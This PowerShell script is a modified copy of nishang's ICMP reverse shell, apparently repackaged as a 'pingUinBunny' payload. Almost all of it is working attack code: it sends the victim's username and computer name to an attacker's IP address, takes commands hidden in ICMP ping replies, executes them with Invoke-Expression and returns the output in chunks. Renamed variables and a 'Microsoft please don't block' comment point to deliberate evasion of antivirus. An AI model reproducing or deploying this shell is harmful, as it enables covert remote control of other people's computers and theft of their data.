function Invoke-pingUin
{ 
<#

Original script by nishang - modified by 0iphor13 for pingUinBunny

.PARAMETER IPAddress
The IP address of the server/listener to connect to.

.PARAMETER Delay
Time in seconds for which the script waits for a command from the server. Default is 5 seconds. 

.PARAMETER BufferSize
The size of output Buffer. Defualt is 128.

.EXAMPLE
# sysctl -w net.ipv4.icmp_echo_ignore_all=1
# python icmpsh_m.py 192.168.254.226 192.168.254.1

Microsoft please don't block, oh dear microsoft corporation
#>           
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,

        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128

    )

    #Basic structure from http://stackoverflow.com/questions/20019053/sending-back-custom-icmp-echo-response
    $ICMPClientsWalkinDownTheStreet = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $MicrosoftCopyright =@"
    
    	I'll pingUin! <3
      			__
                     -=(o '.
                        '.-.\
                        /|  \\
                        '|  ||
        by 0iphor13      _\_):,_
        
        Windows PowerShell running as user $env:username on $env:computername `n
"@;

    # Copyright Copies Right
    $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes($MicrosoftCopyright)
    $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 1000, $NeverGonnaGiveYouUp, $PingOptions) | Out-Null

    #Show an interactive PowerShell prompt
    $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 1000, $NeverGonnaGiveYouUp, $PingOptions) | Out-Null

    while ($true)
    {
        $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 1000, $NeverGonnaGiveYouUp, $PingOptions)
        
        #Check for Command from the server
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($NeverGonnaGiveYouUp.length/$BufferSize)
            $i = 0

            #Fragmant larger output into smaller ones to send to the server.
            if ($NeverGonnaGiveYouUp.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $NeverGonnaGiveYouUp2 = $NeverGonnaGiveYouUp[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
                    $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 10000, $NeverGonnaGiveYouUp2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $NeverGonnaGiveYouUp.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $NeverGonnaGiveYouUp2 = $NeverGonnaGiveYouUp[($i*$BufferSize)..($NeverGonnaGiveYouUp.Length)]
                    $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 10000, $NeverGonnaGiveYouUp2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 10000, $NeverGonnaGiveYouUp, $PingOptions) | Out-Null
            }
            $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 1000, $NeverGonnaGiveYouUp, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}
